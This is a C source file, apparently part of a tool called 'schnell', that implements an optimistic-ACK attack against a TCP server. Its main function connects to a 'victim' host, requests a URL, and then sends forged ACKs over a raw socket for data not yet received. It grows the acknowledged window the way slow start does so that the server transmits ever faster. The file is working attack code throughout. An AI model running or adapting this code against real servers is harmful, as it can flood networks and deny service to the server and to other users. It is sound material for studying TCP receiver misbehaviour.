#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/types.h>
#include <pcap.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <signal.h>

#include "schnell.h"
#include "utils.h"

int sendRealHTMLGet(int);
unsigned int countbytes(int,int);

int do_schnell8_attack(int rawSock){
	int sock;
	int startSeq;
	struct timespec sleepTime;
	int slowstart;
	int ecwnd;
	int i;
	unsigned int MaxWindow = 2<<30;

	// make a tcp connection
	sock = make_tcp_connection_from_port_with_options(victimFQHN,victimPort,localPort,MSS,2<<31);
	if(sock<0){
		perror("make_tcp_connection");
		return -1;
	}
	sendRealHTMLGet(sock);
	getSYNACK(rawSock);

	sleepTime.tv_sec=0;
	sleepTime.tv_nsec = usRTT*1000;
	ecwnd = 2*MSS;
	startSeq=victimSequence;
	Window=65534;

	slowstart=1;
	while(countbytes(victimSequence,startSeq)<FileSize){
		nanosleep(&sleepTime,NULL);
		if(slowstart){
			for(i=0;i<(ecwnd/MSS);i++){
				victimSequence+=MSS;
				sendACK(rawSock);
			}
			ecwnd*=2;
			if(ecwnd>MaxWindow){
				ecwnd=MaxWindow;
				slowstart=0;
				Window=65535;
			}
		} else {	// congestion avoidance
			victimSequence+=ecwnd;
			sendACK(rawSock);
		}
	}
				
	return 0;
}

/*****************************************************
 * sendRealHTMLGet()
 */

int sendRealHTMLGet(int sock){
	char buf[BUFLEN];
	int count,len,tmp;
	snprintf(buf,BUFLEN,"GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
			URL,victimFQHN);
	count=0;
	len = strlen(buf);
	while(count<len){
		tmp=write(sock,&buf[count],len-count);
		if(tmp<=0){
			perror("sendRealHTMLGet::write");
			return -1;
		}
		count+=tmp;
	}
	localSequence+=len;
	return 0;
}

/******************************************************
 * countbytes(stop,start)
 * 	return the number of bytes from seq start to seq stop
 * 	with wrap around if necessary
 */

unsigned int countbytes(int stop, int start){
	if(start<=stop)
		return stop-start;
	else 
		return (0xffffffff-start)+stop;
}
